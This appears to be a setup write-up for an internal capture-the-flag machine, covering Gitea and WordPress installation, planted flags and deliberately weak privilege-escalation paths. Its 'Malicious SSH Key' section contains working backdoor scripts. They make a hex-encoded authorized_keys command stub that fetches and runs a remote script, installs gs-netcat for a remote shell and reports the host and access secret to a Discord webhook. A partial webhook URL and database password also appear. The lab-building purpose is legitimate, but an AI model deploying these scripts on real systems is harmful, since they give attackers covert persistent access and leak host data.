# amogesus Setup

## Set Timezone

```c
root@amogesus:~# timedatectl set-timezone Europe/Berlin
```

## Update Server OS

```c
root@amogesus:~# apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get autoremove && apt-get autoclean
```

## Packages

```c
root@amogesus:~# apt-get install apt-transport-https curl fail2ban gcc git nginx unzip software-properties-common vim
```

## User Configuration

```c
root@amogesus:~# useradd -m codesus
root@amogesus:~# passwd codesus
root@amogesus:~# passwd root
root@amogesus:~# usermod -s /bin/bash codesus
root@amogesus:~# ln /dev/null ~/.bash_history -sf
codesus@amogus:~$ ln /dev/null ~/.bash_history -sf
```

## SSH

* Copy authorized_keys to the .ssh folder in the home directory of root
* Copy sshd_config to /etc/ssh/

```c
root@amogesus:~/.ssh# echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzh+4yeTmN7TkzjeBmmVn9Act/SZCYgmuMK33FVUGyf' > authorized_keys
```

## fail2ban

* Copy fail2ban.conf to /etc/fail2ban/
* Copy jail.local to /etc/fail2ban/
* Copy nginx-badbots.conf to /etc/fail2ban/filter.d/
* Copy nginx-noscript.conf /etc/fail2ban/filter.d/

## crontab

```c
root@amogesus:~# crontab -e
0 */12 * * * certbot renew --pre-hook "service nginx stop" --post-hook "service nginx start"
```

## Update fstab

Add the following line to `/etc/fstab`:

```c
proc  /proc       proc    defaults,hidepid=2    0    0
```

## Nginx

* Copy nginx.conf /etc/nginx/
* Copy website to /etc/nginx/sites-available/
* Set symlink ln -s /etc/nginx/sites-available/website /etc/nginx/sites-enabled/
* Create files folder in /var/www/html

> https://html5up.net/

## Let's Encrypt

```c
root@amogesus:~# apt-get install letsencrypt
```

```c
root@amogesus:~# certbot certonly --rsa-key-size 2048 --standalone --agree-tos --no-eff-email --email purplestormctf@proton.me -d amogesus.com
```

## Enable Services

```c
root@amogesus:~# systemctl enable fail2ban
root@amogesus:~# systemctl enable nginx
root@amogesus:~# systemctl start fail2ban
root@amogesus:~# systemctl start nginx
root@amogesus:~# systemctl restart sshd
root@amogesus:~# systemctl reboot
```

## Gitea

> https://linuxize.com/post/how-to-install-gitea-on-ubuntu-20-04/

```c
root@amogesus:/# apt-get install sqlite3
```

```c
root@amogesus:/# adduser \
   --system \
   --shell /bin/bash \
   --gecos 'Git Version Control' \
   --group \
   --disabled-password \
   --home /home/git \
   git
```

```c
root@amogesus:/# usermod -aG sudo codesus
```

> https://dl.gitea.com/gitea/

```c
codesus@amogesus:/$ sudo wget -O /tmp/gitea https://dl.gitea.io/gitea/1.21.3/gitea-1.21.3-linux-amd64
```

```c
codesus@amogesus:~$ sudo mv /tmp/gitea /usr/local/bin
```

```c
codesus@amogesus:~$ sudo chmod +x /usr/local/bin/gitea
```

```c
codesus@amogesus:~$ sudo mkdir -p /var/lib/gitea/{custom,data,log}
codesus@amogesus:~$ sudo chown -R git:git /var/lib/gitea/
codesus@amogesus:~$ sudo chmod -R 750 /var/lib/gitea/
codesus@amogesus:~$ sudo mkdir /etc/gitea
codesus@amogesus:~$ sudo chown root:git /etc/gitea
codesus@amogesus:~$ sudo chmod 770 /etc/gitea
```

```c
sudo wget https://raw.githubusercontent.com/go-gitea/gitea/main/contrib/systemd/gitea.service -P /etc/systemd/system/
```

```c
codesus@amogesus:~$ sudo systemctl daemon-reload
codesus@amogesus:~$ sudo systemctl enable --now gitea
```

Set the database to `sqlite3` and use an absolute path like `/var/lib/gitea/data/gitea.db`. Also update the company name to `AMOGESUS - CODESUS`.

Instead of using the IP address, go for the domain name `https://git.amogesus.com`.

```c
codesus@amogesus:~$ sudo chmod 750 /etc/gitea
codesus@amogesus:~$ sudo chmod 640 /etc/gitea/app.ini
```

```c
root@amogesus:/etc/gitea# app.ini
...
DISABLE_REGISTRATION = true
...
root@amogesus:/etc/gitea# systemctl restart gitea
```

```c
root@amogesus:/etc/nginx/sites-available# certbot certonly --rsa-key-size 2048 --standalone --agree-tos --no-eff-email --email purplestormctf@proton.me -d git.amogesus.com
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Requesting a certificate for git.amogesus.com

Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/git.amogesus.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/git.amogesus.com/privkey.pem
This certificate expires on 2024-04-04.
These files will be updated when the certificate renews.
Certbot has set up a scheduled task to automatically renew this certificate in the background.

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
If you like Certbot, please consider supporting our work by:
 * Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate
 * Donating to EFF:                    https://eff.org/donate-le
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
```

```c
root@amogesus:/etc/nginx/sites-available# cat git
server {
    listen 80;
    server_name git.amogesus.com;

#    include snippets/letsencrypt.conf;
    return 301 https://git.amogesus.com$request_uri;
}

server {
    listen 443 ssl http2;
    server_name git.amogesus.com;

    proxy_read_timeout 720s;
    proxy_connect_timeout 720s;
    proxy_send_timeout 720s;

    client_max_body_size 50m;

    # Proxy headers
    proxy_set_header X-Forwarded-Host $host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Real-IP $remote_addr;

    # SSL parameters
    ssl_certificate /etc/letsencrypt/live/git.amogesus.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/git.amogesus.com/privkey.pem;
#    ssl_trusted_certificate /etc/letsencrypt/live/git.amogesus.com/chain.pem;
#    include snippets/letsencrypt.conf;
#    include snippets/ssl.conf;

    # log files
    access_log /var/log/nginx/git.amogesus.com.access.log;
    error_log /var/log/nginx/git.amogesus.com.error.log;

    # Handle / requests
    location / {
       proxy_redirect off;
       proxy_pass http://127.0.0.1:3000;
    }
}
```

* Set symlink ln -s /etc/nginx/sites-available/git /etc/nginx/sites-enabled/

> https://git.amogesus.com/

```c
root@amogesus:/etc/nginx/sites-available# deluser codesus sudo
Removing user `codesus' from group `sudo' ...
Done.
```

## Pseudo Code for Gitea Flag

Create a `dev` branch and edit the code.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define KEY 0x1F // Encryption/Decryption key

// Function to encrypt and decrypt data using a simple XOR cipher
void encryptDecrypt(char *line) {
    char *ptr = line;
    while (*ptr != '\0') {
        *ptr = *ptr ^ KEY; // XOR operation with the key
        ptr++;
    }
}

// Function to check for potential vulnerabilities in encrypted code samples
void checkForVulnerabilities(FILE *file) {
    char line[256];
    int lineNum = 0;
    int foundVulnerabilities = 0; // Flag to track if vulnerabilities were found

    while (fgets(line, sizeof(line), file)) {
        lineNum++;
        
        // Decrypt line before checking for vulnerabilities
        encryptDecrypt(line);

        // Check for potential vulnerabilities after decryption
        if (strstr(line, "password") != NULL) {
            printf("Potential password found in line %d\n", lineNum);
            printf("Severity: High\n");
            foundVulnerabilities = 1; // Set flag to true
        }
        if (strstr(line, "api_key") != NULL || strstr(line, "API_KEY") != NULL) {
            printf("Potential API key found in line %d\n", lineNum);
            printf("Severity: Medium\n");
            foundVulnerabilities = 1; // Set flag to true
        }
    }

    if (foundVulnerabilities) {
        printf("\nSending email notification about potential vulnerabilities...\n");
        // Simulate sending an email notification
        printf("Email sent to admin@example.com: Potential vulnerabilities found in code samples.\n");
    } else {
        printf("\nNo potential vulnerabilities found.\n");
    }
}

// Function to simulate a scan for encrypted code samples
void simulateScan() {
    printf("Simulating scanning for encrypted code samples...\n");
    // Simulated delay to mimic a lengthy process
    // PS{JndlaN51qITx89yh7uf2utUw49fX27JV}
    for (int i = 0; i < 5; ++i) {
        printf("Scanning... %d%% complete\n", (i + 1) * 20);
    }
    printf("Scan complete.\n");
}

// Function to collect system information
void collectSystemInfo() {
    printf("\nCollecting system information...\n");

    // Execute system commands to collect information and print the output
    system("hostname");
    system("cat /proc/cpuinfo | grep 'model name\\|processor'");
    system("free -m");
    system("df -h");
}

int main() {
    FILE *file;
    char filename[50];

    printf("Enter the name of the file with encrypted code samples: ");
    scanf("%s", filename);

    simulateScan();

    file = fopen(filename, "r");
    if (file == NULL) {
        printf("Could not open file %s\n", filename);
        return 1;
    }

    checkForVulnerabilities(file);

    fclose(file);

    collectSystemInfo();

    return 0;
}

```

## Wordpress

> https://www.linuxbabe.com/ubuntu/install-wordpress-ubuntu-22-04-nginx-mariadb-php8-1-lemp

> https://wordpress.org/download/

* Download the latest package and drop it in `/var/www/html/`.

### Database Configuration

```c
root@amogesus:/var/www/html/wordpress# apt-get install mariadb-server
```

```c
root@amogesus:/var/www/html/wordpress# mariadb -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 31
Server version: 10.6.12-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```c
MariaDB [(none)]> create database wordpress;
```

```c
MariaDB [(none)]> create user wpuser@localhost identified by '3i1rpiB<--- SNIP --->kngDQnYShzQe';
```

```c
MariaDB [(none)]> grant all privileges on wordpress.* to wpuser@localhost;
```

```c
MariaDB [(none)]> flush privileges;
```

```c
MariaDB [(none)]> exit;
```

### Wordpress Configuration

```c
root@amogesus:/var/www/html/wordpress# cp wp-config-sample.php wp-config.php
```

```c
root@amogesus:/var/www/html/wordpress# vi wp-config.php 
```

```c
root@amogesus:/var/www/html/wordpress# cat wp-config.php                                             
<?php      
/**        
 * The base configuration for WordPress                                                              
 *         
 * The wp-config.php creation script uses this file during the installation.                         
 * You don't have to use the web site, you can copy this file to "wp-config.php"                     
 * and fill in the values.                                                                           
 *         
 * This file contains the following configurations:                                                  
 *         
 * * Database settings                                                                               
 * * Secret keys                                                                                     
 * * Database table prefix                                                                           
 * * ABSPATH                                                                                         
 *         
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *         
 * @package WordPress                                                                                
 */        
           
// ** Database settings - You can get this info from your web host ** //                             
/** The name of the database for WordPress */                                                        
define( 'DB_NAME', 'wordpress' );                                                                    
           
/** Database username */                                                                             
define( 'DB_USER', 'wpuser' );                                                                       
           
/** Database password */                                                                             
define( 'DB_PASSWORD', '3i1rpiB<--- SNIP --->kngDQnYShzQe' );
```

```c
$table_prefix = 'am0gus1_';
```

```c
root@amogesus:/var/www/html/wordpress# chmod 640 wp-config.php
```

```c
root@amogesus:/var/www/html# chown www-data:www-data wordpress/ -R
```

```c
root@amogesus:/etc/nginx/sites-available# certbot certonly --rsa-key-size 2048 --standalone --agree-tos --no-eff-email --email purplestormctf@proton.me -d blog.amogesus.com
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Requesting a certificate for blog.amogesus.com

Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/blog.amogesus.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/blog.amogesus.com/privkey.pem
This certificate expires on 2024-04-04.
These files will be updated when the certificate renews.
Certbot has set up a scheduled task to automatically renew this certificate in the background.

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
If you like Certbot, please consider supporting our work by:
 * Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate
 * Donating to EFF:                    https://eff.org/donate-le
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
```

```c
root@amogesus:/etc/nginx/sites-available# apt-get install php-imagick php8.1-fpm php8.1-mbstring php8.1-bcmath php8.1-xml php8.1-mysql php8.1-common php8.1-gd php8.1-cli php8.1-curl php8.1-zip
```

```c
root@amogesus:/etc/nginx/sites-available# systemctl reload php8.1-fpm nginx
```

```c
root@amogesus:/etc/nginx/sites-available# cat blog
server {
    listen 80;
    server_name blog.amogesus.com;
    return 301 https://blog.amogesus.com$request_uri;
}

server {
    listen 443 ssl http2;
    server_name blog.amogesus.com;

    proxy_read_timeout 720s;
    proxy_connect_timeout 720s;
    proxy_send_timeout 720s;

    # Proxy headers
    proxy_set_header X-Forwarded-Host $host;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_set_header X-Real-IP $remote_addr;

    # SSL parameters
    ssl_certificate /etc/letsencrypt/live/blog.amogesus.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/blog.amogesus.com/privkey.pem;

    # root directory
    root /var/www/html/wordpress/;
    index index.php index.html index.htm index.nginx-debian.html;

    location / {                                                                                      
    try_files $uri $uri/ /index.php;
    }      
         
    location ~ ^/wp-json/ {                                                                          
    rewrite ^/wp-json/(.*?)$ /?rest_route=/$1 last;                                                
    }     
         
    location ~* /wp-sitemap.*\.xml {                                                                  
    try_files $uri $uri/ /index.php$is_args$args;                                                   
    }      
         
    error_page 404 /404.html;                                                                         
    error_page 500 502 503 504 /50x.html;                                                             
         
    client_max_body_size 20M;                                                                         
         
    location = /50x.html {                                                                            
    root /var/www/html/wordpress/;                                                                  
    }      
         
    location ~ \.php$ {                                                                               
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;                                                     
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;                               
    include fastcgi_params;                                                                         
    include snippets/fastcgi-php.conf;                                                              
    fastcgi_buffers 1024 4k;                                                                        
    fastcgi_buffer_size 128k;                                                                       
    }      
         
    #enable gzip compression                                                                          
    gzip on;
    gzip_vary on;
    gzip_min_length 1000;
    gzip_comp_level 5;
    gzip_types application/json text/css application/x-javascript application/javascript image/svg+xml;
    gzip_proxied any;

    # A long browser cache lifetime can speed up repeat visits to your page
    location ~* \.(jpg|jpeg|gif|png|webp|svg|woff|woff2|ttf|css|js|ico|xml)$ {
       access_log        off;
       log_not_found     off;
       expires           360d;
    }

    # disable access to hidden files
    location ~ /\.ht {
       access_log off;
       log_not_found off;
       deny all;
    }

    # log files
    access_log /var/log/nginx/blog.amogesus.com.access.log;
    error_log /var/log/nginx/blog.amogesus.com.error.log;
}
```

* Set symlink ln -s /etc/nginx/sites-available/blog /etc/nginx/sites-enabled/

> https://blog.amogesus.com/wp-admin/install.php

```c
root@amogesus:/etc/nginx/sites-available# mysql_secure_installation

NOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB
      SERVERS IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!                                   
           
In order to log into MariaDB to secure it, we'll need the current                                    
password for the root user. If you've just installed MariaDB, and                                    
haven't set the root password yet, you should just press enter here.                                 
           
Enter current password for root (enter for none):                                                    
OK, successfully used password, moving on...                                                         
           
Setting the root password or using the unix_socket ensures that nobody                               
can log into the MariaDB root user without the proper authorisation.

You already have your root account protected, so you can safely answer 'n'.

Switch to unix_socket authentication [Y/n] 
Enabled successfully!
Reloading privilege tables..
 ... Success!


You already have your root account protected, so you can safely answer 'n'.

Change the root password? [Y/n] n
 ... skipping.

By default, a MariaDB installation has an anonymous user, allowing anyone
to log into MariaDB without having to have a user account created for
them.  This is intended only for testing, and to make the installation
go a bit smoother.  You should remove them before moving into a
production environment.

Remove anonymous users? [Y/n] 
 ... Success!

Normally, root should only be allowed to connect from 'localhost'.  This
ensures that someone cannot guess at the root password from the network.

Disallow root login remotely? [Y/n] n
 ... skipping.

By default, MariaDB comes with a database named 'test' that anyone can
access.  This is also intended only for testing, and should be removed
before moving into a production environment.

Remove test database and access to it? [Y/n] 
 - Dropping test database...
 ... Success!
 - Removing privileges on test database...
 ... Success!

Reloading the privilege tables will ensure that all changes made so far
will take effect immediately.

Reload privilege tables now? [Y/n] 
 ... Success!

Cleaning up...

All done!  If you've completed all of the above steps, your MariaDB
installation should now be secure.

Thanks for using MariaDB!
```

### Backup for Foothold

> https://blog.amogesus.com/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty

```c
<?php
/**
 * The template for displaying the 404 template in the Twenty Twenty theme.
 *
 * @package WordPress
 * @subpackage Twenty_Twenty
 * @since Twenty Twenty 1.0
 */

get_header();
?>

<main id="site-content">

	<div class="section-inner thin error404-content">

		<h1 class="entry-title"><?php _e( 'Page Not Found', 'twentytwenty' ); ?></h1>

		<div class="intro-text"><p><?php _e( 'The page you were looking for could not be found. It might have been removed, renamed, or did not exist in the first place.', 'twentytwenty' ); ?></p></div>

		<?php
		get_search_form(
			array(
				'aria_label' => __( '404 not found', 'twentytwenty' ),
			)
		);
		?>

	</div><!-- .section-inner -->

</main><!-- #site-content -->

<?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>

<?php
get_footer();

```

### Trigger

> https://blog.amogesus.com/index.php/asdf

## Wordpress Flag

```c
A company with a special attitude.

<--- SNIP --->

--

syro

Signed with PGP


-----BEGIN PGP PUBLIC KEY BLOCK-----

mQENBF9c4qYBCAC2k7r6yfDLj3f0CRPKZuqzDo5mgJn7aXk/gt+7iDN8LhbVU7yE
1JqXU7ohPj4SK2pplmj88+cYdrp/7+0rkUBr90JDEwIDAQABzRq7R8oZoGazIeLF
n15YW7vYWifLRRvJ2ONF2g6RYPd3avsnTFSFIMMfN/NNie7q0M9hbRLxhLgLvMxm
dIzoGMgC2Y7Dv3YwDFOJ3LGiMEdnbV7id90x7QoL3qZjx3KqK78+R9hZfYYXDLs4
5hEQ5/2V4J1JPS{X6ISo0LwQ816h7idaoyOYSNus3d6xn1x}kj2b7sbGqQgFt62z
35fC0XQcA9k2uSh0+P+K0Aur8iA3rYhRbbyjABEBAAG0LVN0ZXZlIFN0YWdpbmcg
U2lnbmluZyBLZXkgPG1haWxAZXhhbXBsZS5jb20+iQE4BBMBAgAiBQJfXOKmAhsD
BgsJCAcDAgYVCAIJCgsEFgIDAQIeAQIXgAAKCRAz+o+XJLpEhkgZB/4zRKrmDMcp
qKbh8zC02+YIwf5mObxK/1qFksk8aFazJ/YL7SKveSNfKFd8W9k+gzpMKYpsieZI
2L+FuE+eEOD9qkSfWb/AUsj8MfcbF3zEX6Xe4HtrE60vtyy/xuCytTLe3bIA52o5
YRn2JbGCVhtHjC/5g/H3k9Y=

=qMkR
-----END PGP PUBLIC KEY BLOCK-----

```

## Privilege Escalation Service

The service is not needed, it is just for pointing people in the right direction.

```c
root@amogesus:/etc/systemd/system# cat dns.service 
[Unit]
Description=Execute dns.sh every minute as codesus

[Service]
Type=simple
User=codesus
ExecStart=/usr/local/bin/dns.sh

[Install]
WantedBy=multi-user.target

```

```c
root@amogesus:/usr/local/bin# cat dns.sh 
#!/bin/bash
dig amogesus.com > /var/log/dns.log 2>&1
```

```c
root@amogesus:/etc/systemd/system# groupadd dns
root@amogesus:/etc/systemd/system# usermod -aG dns codesus
root@amogesus:/etc/systemd/system# usermod -aG dns www-data
root@amogesus:/usr/local/bin# chown :dns dns.sh
root@amogesus:/usr/local/bin# chmod 666 dns.sh
root@amogesus:/usr/local/bin# chmod +x dns.sh
root@amogesus:/usr/local/bin# chown :dns /var/log/dns.log
root@amogesus:/usr/local/bin# chmod 666 /var/log/dns.log
root@amogesus:/usr/local/bin# systemctl daemon-reload
root@amogesus:/usr/local/bin# systemctl enable dns.service
root@amogesus:/usr/local/bin# systemctl start dns.service
```

## Dropper Binary Placement

```c
root@amogesus:/opt# mkdir ...
root@amogesus:/opt# cd ...
root@amogesus:/opt/...# mkdir secret
root@amogesus:/opt/...# cd secret
root@amogesus:/opt/.../secret# gcc dropper.c -o dropper
root@amogesus:/opt/.../secret# ./dropper
root@amogesus:/opt# chown root:codesus ...
root@amogesus:/opt# chmod 750 ...
root@amogesus:/opt# cd ...
root@amogesus:/opt/...# chown root:codesus secret
root@amogesus:/opt/...# chmod 750 secret
root@amogesus:/opt/...# cd secret
root@amogesus:/opt/.../secret# chmod 711 dropper
```

```c
root@amogesus:/opt# ls -la
total 16
drwxr-xr-x  4 root root    4096 Jan  4 22:34 .
drwxr-xr-x 19 root root    4096 Jan  4 23:56 ..
drwxr-x---  3 root codesus 4096 Jan  4 22:35 ...
drwxr-xr-x  4 root root    4096 Jan  4 18:20 digitalocean
```

```c
root@amogesus:/opt/...# ls -la
total 12
drwxr-x--- 3 root codesus 4096 Jan  4 22:35 .
drwxr-xr-x 4 root root    4096 Jan  4 22:34 ..
drwxr-x--- 2 root codesus 4096 Jan  5 21:36 secret
```

```c
root@amogesus:/opt/.../secret# ls -la
total 24
dr-xr-xr-x 2 root root     4096 Jan  5 21:36 .
drwxr-x--- 3 root codesus  4096 Jan  4 22:35 ..
-rwx--x--x 1 root root    16176 Jan  5 21:36 dropper
```

## Malicious SSH Key

### Discord Webhook

```c
https://discord.com/api/webhooks/1192602702782398505/dfEsvcCkjGBLDtZ<--- SNIP --->bNr1UZnixM_Lp2qfVX3x
```

### backdoor.sh

```c
#! /bin/bash

# Create a BACKDOOR-STUB for ~/.ssh/authorized_keys or ~/.ssh/id_rsa.pub

if [[ -t 1 ]]; then
    CDR="\\033[0;31m" # red
    CDY="\\033[0;33m" # yellow
    CY="\\033[1;33m" # yellow
    CDM="\\033[0;35m" # magenta
    CM="\\033[1;35m" # magenta
    CDC="\\033[0;36m" # cyan
    CN="\\033[0m"    # none
    out(){ echo "$@";}
else
    out(){ :;}
fi

# This stub is encoded for the ssh-key 'command='.
stubs(){ ###___STUBS___
    # - Check if /bin/sh and .ssh have the same date. We set it to the _same_ date
    #   to mark that the backdoor has been installed.
    # Note: Do not remove the ':' at the end of the first and last line.
    [[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && { :
        touch -r /bin/sh .ssh
        ###-----BEGIN BACKDOOR-----
        # Anything from here until -----END BACKDOOR----- will
        # be executed once when the user logs in. All output goes
        # to stderr.
        #
        # In our DEMO example we request a backdoor script
        # from thc.org/sshx. PLEASE CHANGE THIS.
        # 
        # Note from syro: I already changed the point above
        # and changed it to backdoor_staged.sh.
        #
        # Set a DISCORD KEY:
        export KEY="%%KEY%%"
        # Request and execute sshx (which will install gs-netcat and
        # report the result back to our DISCORD channel)
        bash -c "$(curl -fsSL <--- SNIP --->/files/backdoor_staged.sh)" || bash -c "$(wget --no-verbose -O- <--- SNIP --->/files/backdoor_staged.sh)" || exit 0
        ###-----END BACKDOOR-----
    } >/dev/null 2>/dev/null & :
    [[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
    [[ -z $SHELL ]] && SHELL=/bin/bash
    [[ -f /run/motd.dynamic ]] && cat /run/motd.dynamic
    [[ -f /etc/motd ]] && cat /etc/motd
    exec -a -$(basename $SHELL) $SHELL
} ###___STUBS___

# Read my own script and extract the above stub into a variable.
get_stubs()
{
    local IFS
    IFS=""
    STUB="$(<"$0")"
    STUB="${STUB#*___STUBS___}"
    STUB="${STUB%%\} \#\#\#___STUBS___*}"
}

get_stubs
cmd=$(echo "$STUB" | sed 's/^[[:blank:]]*//' | sed '/^$/d' | sed '/^#/d' | tr '\n' ';' | sed "s|%%KEY%%|${KEY}|")

if [[ $1 == clear ]]; then
    cmd=${cmd//\"/\\\"}
else
    bd=$(echo "$cmd" | xxd -ps -c2048)
    cmd="eval \$(echo $bd|xxd -r -ps);"
fi

[[ -z $KEY ]] && out -e "=========================================================================
${CDR}WARNING${CN}: The default reports to THC's Discord channel.
Set your own DISCORD WEBHOOK KEY:
    ${CDC}KEY=\"1192602702782398505/dfEsvcCkjGBLDtZ<--- SNIP --->bNr1UZnixM_Lp2qfVX3x\" $0${CN}
========================================================================="

out -e "${CDY}Prepend this to every line in ${CY}~/.ssh/authorized_keys${CDY}
and ${CY}~/.ssh/id_rsa.pub${CDY} so that it looks like this${CN}:"
echo -en "${CM}no-user-rc,no-X11-forwarding,command=\"${CDM}\`###---POWERSHELL---\`;${cmd}${CM}\"${CN}"
# echo -en "${CM}command=${CM}\"${CDM}\`###---POWERSHELL---\`;bash -c '{ ${cmd}}'${CM}\"${CN}"
out " ssh-ed25519 AAAAC3Nzblah...."
```

### backdoor_staged.sh

```c
#! /bin/bash

# This is an example script to demonstrate how ssh keys can be used to
# as a permanent backdoor and to move laterally through a network.
#
# If you find this on your network then somebody tested our tool and
# forgot to change the script's URL. Contact us at root@proton.thc.org.


# Discord API key
# This key can be changed HERE or you can set  your own key with
# KEY=<YOUR DISCORD WEBHOOK KEY> ./gen
[[ -z $KEY ]] && KEY="1192602702782398505/dfEsvcCkjGBLDtZ<--- SNIP --->bNr1UZnixM_Lp2qfVX3x"

# Install GS-NETCAT and report installation back to DISCORD.
command -v curl >/dev/null && IS_CURL=1 || command -v wget >/dev/null && IS_WGET=1 || exit 0
if [[ -n $IS_CURL ]]; then
    S="$(bash -c "$(curl -fsSL gsocket.io/x)")"
else
    S="$(bash -c "$(wget --no-verbose -O- gsocket.io/x)")"
fi
S=${S##*S=\"}
S=${S%%\"*}
X=($(hostname; uname -mrs))
MSG="${USER} ${X[*]} -- gs-netcat -i -s${S:-BAD}"

DATA='{"username": "sshx", "content": "'"$MSG"'"}'
if [[ -n $IS_CURL ]]; then
    curl -H "Content-Type: application/json" -d "${DATA}" "https://discord.com/api/webhooks/${KEY}"
else
    wget -q -O- --header="Content-Type: application/json" --post-data="${DATA}" "https://discord.com/api/webhooks/${KEY}"
fi
exit 0
```

### Malicious SSH Key for authorized_keys File on root

I modified the SSH key slightly to make sure that the `gangoperator` user can't login as root directly.

```c
no-user-rc,no-X11-forwarding,command="`###---POWERSHELL---`;eval $(echo 5b5b20242873746174202d632559202f62696e2f73682920213d20242873746174202d632559202e73736829205d5d202626207b203a3b746f756368202d72202f62696e2f7368202e7373683b6578706f7274204b45593d22223b62617368202d63202224286375726c202d6673534c203137342e3133382e3130312e3131352f66696c65732f6261636b646f6f725f7374616765642e73682922207c7c2062617368202d63202224287767<--- SNIP --->66696c65732f6261636b646f6f725f7374616765642e73682922207c7c206578697420303b7d203e2f6465762f6e756c6c20323e2f6465762f6e756c6c2026203a3b5b5b202d6e20245353485f4f524947494e414c5f434f4d4d414e44205d5d202626206578656320245353485f4f524947494e414c5f434f4d4d414e443b5b5b202d7a20245348454c4c205d5d202626205348454c4c3d2f62696e2f626173683b5b5b202d66202f72756e2f6d6f74642e64796e616d6963205d5d20262620636174202f72756e2f6d6f74642e64796e616d69633b5b5b202d66202f6574632f6d6f7464205d5d20262620636174202f6574632f6d6f74643b65786563202d61202d2428626173656e616d6520245348454c4c2920245348454c4c3b0a|xxd -r -ps);" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCm5GvDzZzCTtWL9nRLd2E1FSxQuQ/mY7KxD5/LmEpBl1A47Dxf14VBkFUkXk8XqtXesqkfE2HhUvGyBOPqCrJccA+eLtQa0I19rgdYn7DH0SUzZtKJj6Sx9T+sI/qhFQVNmcMVvvq+1LaTpDwCR6q6xvPRWv6ernsDiBdExZ5RX1y4HZtff211N6UnvF0YWtnD78+0AhULNXqpVaUYGDF2h7wfgyOd4TXyvfoh9Jurj397/9NIpEmXu/aWeJSncXN7luwrYbupEmlf5uQFi17LuHL6t4CLVip4jufEdYKH0ahJzjqc7AG6TxCJmOxqAyUQmF4LneidCJ0fNluCLJAbrHx2QXMjjfUw5LDk/9u9i5ZlOWL6b1Bq505RMhBRfd4tbuAzu3DrEgUAddc0Et3oa6Lr2h5zyE3c935R/8LEGQJt5WSrAVCGafXSy9n1Ep2bfmlZ7l6otcVT6OSaqdJigVnsGALNEVEF3jbhe0lfo3HELcs4cv/5rtlT/GJo5iEEm7mH/lAXmxWr/8PIpnkQf4V/O5urvkfQt3HgslklQxnePhEOwQzou1RusRV7TJHrrv28bNjT1tJs7Qb7XPyMvi3ppieNAbI6dQlArL2IXsfhCjvI6RYdFNwg0EE93W/kq2nuVbvOXbwg45+nq33Bi5xK8c4u8yhNY5Q2fJNQ6w== gangoperator@SWMGC2
```

### PoC

```c
root amogesus Linux 5.15.0-91-generic x86_64 -- gs-netcat -i -s<--- SNIP --->W
```

## Cleanup.sh

```c
oot@amogesus:~# cat cleanup.sh 
#!/bin/bash
rm /tmp/dropper
```

```c
root@amogesus:~# chmod +x cleanup.sh
```

Add another entry to the crontab of root.

```c
*/5 * * * * /root/cleanup.sh
```

## CONGRATULATIONS.md

```c
oot@amogesus:~# cat CONGRATULATIONS.md 
!!! CONGRATULATIONS !!!

You made it! Gob job, well done! I just want to thank you for
participating in this first purplestorm team internal CTF and
spending the most important resource you have - your time!

I really appreciate it and it is an honor for me to spend time
with such talented hackers. Thank you for supporting this team
and for being a part of it!

Have a good start into 2024.

--
syro
```